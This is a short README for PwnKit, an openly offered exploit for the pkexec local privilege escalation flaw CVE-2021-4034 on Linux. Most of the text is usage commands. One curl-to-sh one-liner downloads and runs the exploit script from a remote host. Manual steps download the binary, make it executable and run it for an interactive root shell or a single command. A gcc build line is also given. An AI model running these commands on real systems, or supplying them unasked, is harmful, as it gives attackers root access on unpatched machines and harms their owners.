
PwnKit
Self-contained exploit for CVE-2021-4034 - Pkexec Local Privilege Escalation




Usage
Should work out of the box on vulnerable Linux distributions based on Ubuntu, Debian, Fedora, and CentOS.

sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"




Manually
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x ./PwnKit
./PwnKit # interactive shell
./PwnKit 'id' # single command




Build
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
